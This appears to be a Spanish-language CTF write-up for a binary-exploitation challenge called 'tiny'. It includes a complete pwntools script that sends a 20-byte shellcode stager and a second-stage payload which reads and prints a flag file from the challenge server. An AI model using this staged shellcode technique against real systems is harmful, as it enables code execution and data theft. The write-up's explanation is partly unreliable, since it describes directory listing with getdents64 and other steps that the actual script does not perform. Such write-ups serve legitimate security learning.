---
title: "Fluid Attacks CTF 2026: Pwn - The Tiny One"
date: 2026-02-01
description: "Binary Exploitation bajo restricciones extremas de espacio usando Multi-Stage Shellcoding."
tags: ["CTF", "Pwn", "Shellcoding", "Assembly", "Linux"]
image: "/images/blog/fluid-pwn-tiny.png"
---

## 🎯 Objetivo

El binario `tiny` presentaba un desafío clásico de explotación: permitía ejecutar código arbitrario (shellcode) pero con una restricción severa: el buffer de entrada era extremadamente pequeño.

No había espacio suficiente para un payload convencional (`execve /bin/sh`).

## 🧠 Estrategia: Multi-Stage Shellcode

Para superar la limitación de espacio, implementamos un ataque en dos etapas.

### Stage 1: El Cargador (The Stager)

El objetivo de la primera etapa es simple: leer más bytes desde la entrada estándar (`stdin`) y escribirlos en una zona de memoria ejecutable, para luego saltar a ella.

Logramos condensar esto en solo **20 bytes** de ensamblador x64 optimizado:

### Full Exploit Script (`tiny.py`)

```python
from pwn import *

context.arch = "amd64"
context.os = "linux"

HOST = "5a01dcd6f6e49d3b.chal.ctf.ae"
PORT = 443

# Stage1: read(0, rax+0x20, 0xff); jmp rsi   (20 bytes)
stager = bytes.fromhex("31ff4889c64883c62031d2b2ff31c00f05ffe690")
assert len(stager) == 20

# Stage2: openat(".", O_DIRECTORY) -> getdents64 -> write -> exit
from keystone import *

ks = Ks(KS_ARCH_X86, KS_MODE_64)

# Stage2: JMP-CALL-POP (String appended in Python)
assembly = r"""
jmp get_filename
entry_point:
pop rdi
mov rax, 2
xor rsi, rsi
xor rdx, rdx
syscall
mov rdi, rax
mov rax, 0
sub rsp, 0x100
mov rsi, rsp
mov rdx, 0x100
syscall
mov rdx, rax
mov rax, 1
mov rdi, 1
mov rsi, rsp
syscall
mov rax, 60
xor rdi, rdi
syscall
get_filename:
call entry_point
"""

encoding, count = ks.asm(assembly)
stage2 = bytes(encoding) + b"flag_gErxRYXT5vVmuf2O.txt\0"

io = remote(host=HOST, port=PORT, ssl=True, sni=HOST)
io.recv(timeout=1)

io.send(stager + stage2)

data = io.recvall(timeout=2)
print(data.decode("latin-1", errors="replace"))
```

**Explicación:**
1.  `xor edi, edi`: Limpia `rdi` (File Descriptor 0 = stdin).
2.  `mov si, ...`: Establece el buffer de destino (`rsi`) justo después de nuestro stager actual.
3.  `syscall`: Llama a `read` para cargar la Etapa 2.
4.  `jmp rsi`: Salta al código recién inyectado.

### Stage 2: La Carga Útil (Payload)

Con la restricción de espacio eliminada, la segunda etapa tiene libertad para realizar la tarea compleja: encontrar y exfiltrar la flag.

El servidor no tenía `cat` o `ls` disponibles fácilmente, así que escribimos un shellcode en ensamblador puro para:
1.  Abrir el directorio actual (`open`, `O_DIRECTORY`).
2.  Listar los archivos (`getdents64`) para encontrar el nombre exacto del archivo de la flag (que era aleatorio).
3.  Escribir el nombre del archivo en la salida (`write`).
4.  Abrir y leer el archivo de la flag.

```python
# Pseudo-código de la Stage 2
assembly = r"""
    # ... setup ...
    mov rax, 2          ; SYS_open
    syscall
    mov rax, 217        ; SYS_getdents64
    syscall
    mov rax, 1          ; SYS_write
    syscall
    # ... exit ...
"""
```

## 🏆 Ejecución

Al concatenar `Stager + Stage2` y enviarlo al servicio remoto, el pequeño stager tomó el control, cargó el resto del exploit, y el sistema nos devolvió el nombre de la flag oculta: `flag_gErxRYXT5vVmuf2O.txt`.
